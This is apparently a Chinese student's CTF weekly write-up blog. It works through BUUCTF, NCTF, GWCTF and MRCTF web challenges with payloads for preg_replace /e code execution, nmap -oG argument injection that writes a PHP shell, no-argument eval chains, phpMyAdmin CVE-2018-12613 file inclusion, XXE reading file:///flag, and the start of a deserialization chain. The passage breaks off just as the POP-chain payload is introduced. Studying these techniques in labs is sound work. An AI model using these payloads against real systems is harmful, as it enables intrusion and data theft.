<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参数可以不管</p>
<p>可以看出，先传参执行complex，来执行getFlag()获得flag</p>
<p>可以先看下面，是其中代码解释</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1fa9fede43fc7f562b8a19d4fc68260f.png" alt="image-20240124204821112"></p>
<p>在页面传参后使$re值为参变量123 $str值为${getflag()}，来传入complex函数</p>
<p>这里解题的关键就是<code>preg_replace()+/e</code>存在代码执行漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/next.php?\S*=$&#123;<span class="title function_ invoke__">getflag</span>()&#125;&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6eaf7473b475be2a149d26c64aa59647.png" alt="image-20240124211307795"></p>
<h2 id="4-BUUCTF-2018-Online-Tool"><a href="#4-BUUCTF-2018-Online-Tool" class="headerlink" title="4.[BUUCTF 2018]Online Tool"></a>4.[BUUCTF 2018]Online Tool</h2><p>首先要知道这escapeshellarg（）和escapeshellcmd（）两个函数组合会产生漏洞<img src="https://i-blog.csdnimg.cn/direct/ee438dc5781d43fc98e4a1053f04f0e9.png" alt="img"></p>
<p>首先看题，接收一个host参数，值自定义，结合字符串经过md5加密后创建目录并切换至目录（这里其实就可以联想到写文件了，创建了目录就是来放东西的）</p>
<p>执行了nmap命令，这里构造payload利用了nmap中的-oG方法，可以实现将命令和结果写到文件</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?h</span>ost=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span></span><br></pre></td></tr></table></figure>

<p>首先payload经过escapeshellarg（）函数后会自动套上一对单引号并对内部单引号转义</p>
<p>即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `cat /flag`;<span class="meta">?&gt;</span> -oG test.php <span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最外层单引号是函数添加的</p>
<p>内部单引号被\转义，\也被添加上双引号</p>
<p>进入escapeshellcmd（）函数后对\和不成对的单引号进行转义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `cat /flag`;<span class="meta">?&gt;</span> -oG test.php <span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里单引号将payload分成了多份</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> \\ <span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span>......php <span class="string">&#x27;\\&#x27;</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样payload就不会被单引号包裹，可以正常执行命令了</p>
<p>值得注意的是，因为后端是linux系统，在linux中，\代表转义符，system执行命令的参数是string类型，转义了也能正常执行，没被单引号包裹的\就是,被单引号包裹的仍是\</p>
<p>第二个值得注意的地方是：</p>
<p>最后的payload要加空格和’</p>
<p>不加空格最后文件名变为test.php\，会被解析为路径，test.php \后面的\会被忽略</p>
<p>不加单引号会变成test.php’，都无法正常执行<img src="https://i-blog.csdnimg.cn/direct/82e59df37b2e48e88878c7b109814712.png" alt="img"></p>
<h2 id="5-GXYCTF2019-禁止套娃"><a href="#5-GXYCTF2019-禁止套娃" class="headerlink" title="5.[GXYCTF2019]禁止套娃"></a>5.[GXYCTF2019]禁止套娃</h2><h3 id="这个题重点在于无参数绕过"><a href="#这个题重点在于无参数绕过" class="headerlink" title="这个题重点在于无参数绕过"></a>这个题重点在于无参数绕过</h3><p>首先来看一下这个界面</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1457dfbfaf04375105c58b4cdeb3c947.png" alt="img"></p>
<p>查看源代码，目录文件扫描以及<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>都没什么有价值的信息。但是web题如果没有什么功能页面，一定有什么提示。若提示也没有，一般就泄露了文件或者源码等。这题就是源码泄露 。使用GitHack</p>
<p>打开index的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显，源码存在三层过滤。</p>
<p>1.第一层，过滤了伪协议，这里不考虑伪协议使用</p>
<p>2.正则表达式，&#x2F;[a-z,_]+&#x2F;</p>
<p>   [a-z,_]：匹配字符与下划线</p>
<p>   +：可匹配前一个表达式多次</p>
<p>   (?R)：整个表达式迭代匹配</p>
<p> （?R)?：允许”()”内出现1个或0个   比如:c(a()b()),c(a())</p>
<pre><code>所以这个正则表达式含义是匹配var_dump(scandir())这种无参数命令执行
</code></pre>
<p>3.过滤了一些函数</p>
<p>scandir(‘.’)是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b0e0ad8a87365b4e05e3c1bdad208de7.png" alt="img"></p>
<p>查看到flag.php在当先数组的第4个位置，所以需要移动指针</p>
<p> end()，next() ，prev() ，reset()  ，each()好像不能重复套娃</p>
<p>因为flag在倒数第二个位置，所以反转数组，在移动指针到下一个即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))));</span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/3ad1f535fcc5411a3dae1d41f9e36365.png" alt="img"></p>
<h2 id="6-GWCTF-2019-我有一个数据库"><a href="#6-GWCTF-2019-我有一个数据库" class="headerlink" title="6.[GWCTF 2019]我有一个数据库"></a>6.[GWCTF 2019]我有一个数据库</h2><p>上来一堆乱码还原：</p>
<p>扫一遍发现数据库登陆页面<img src="https://i-blog.csdnimg.cn/blog_migrate/b4fd1660e79e133613a624728be23c33.png" alt="在这里插入图片描述"></p>
<p>CVE-2018-12613-PhpMyadmin后台文件包含<img src="https://i-blog.csdnimg.cn/blog_migrate/67da621d97255400cac203a8977468e8.png" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! <span class="title function_ invoke__">in_array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; <span class="title class_">Core</span>::<span class="title function_ invoke__">checkPageValidity</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>target_blacklist没啥东西</p>
<p>Core::checkPageValidity($_REQUEST[‘target’])，Core类参数校验方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>target&#x3D;db_datadict.php?&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;flag</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/23117c8e2d209c8eb16bbfdc442bd0cb.png" alt="在这里插入图片描述"></p>
<h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>​     希望下周不会生病()，只要buu不崩，我就要补上这周没做完的题和完成下周的指标</p>
<h1 id="11-24—11-30周"><a href="#11-24—11-30周" class="headerlink" title="11.24—11.30周"></a>11.24—11.30周</h1><p>本周总结:这周基本复现完毕NewStar2025的所有题目，有价值的一些体现在周报里了，太简单的就没有放。整体做下来今年的NewStar的难度不如去年，但是也不乏设计的很好的，让人受益匪浅的题目（ps:week5的最后一道题目还没有打通，下周再蒸一蒸）。buu也做了几道题，但这周感觉学到的东西还是不算多，下周继续努力吧。</p>
<p>同时，我找时间对《你缺失的那门计算机课》这部非常好的作品进行了进一步的总结和缩减，将其发布在了我的博客上面并持续更新，目的就是为了能让完全没接触过计算机的真正的小白快速上手，如果大家有同学或朋友需要这些的，请尽情使用（），在文章的最后我将附上url</p>
<p>写完传到飞书之后才发现，图片都是用我的图床传的，云文档里面看不见，哭了。我把它更新到博客上面了，直接看博客吧–&gt;<a target="_blank" rel="noopener" href="https://shaneior.github.io/2025/11/23/UKY%E5%91%A8%E6%8A%A5/">https://shaneior.github.io/2025/11/23/UKY%E5%91%A8%E6%8A%A5/</a></p>
<h1 id="1-NCTF2019-Fake-XML-cookbook"><a href="#1-NCTF2019-Fake-XML-cookbook" class="headerlink" title="1. [NCTF2019]Fake XML cookbook"></a>1. [NCTF2019]Fake XML cookbook</h1><p>开局一个登录页面，sql注入，SSTI之后发现都不是，随便填个数据抓包看看</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129230616038.png" alt="image-20251129230616038"></p>
<p>发现是xml解析，XXE（XML外部实体注入）漏洞</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129230655397.png" alt="image-20251129230655397"></p>
<p>通过<code>&lt;!ENTITY&gt;</code>声明引用文件，XML解析器会加载并替换实体内容，这里将其替换为可以回显的&amp;admin</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129230828113.png" alt="image-20251129230828113"></p>
<h1 id="2-MRCTF2020-Ezpop"><a href="#2-MRCTF2020-Ezpop" class="headerlink" title="2.[MRCTF2020]Ezpop"></a>2.[MRCTF2020]Ezpop</h1><p>直接给源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag.php应该在web目录下面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>include函数为我们提供了个接口，直接包含flag.php文件。为了实现该方法必须有个调用函数的方式。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接开始payload代码</p>
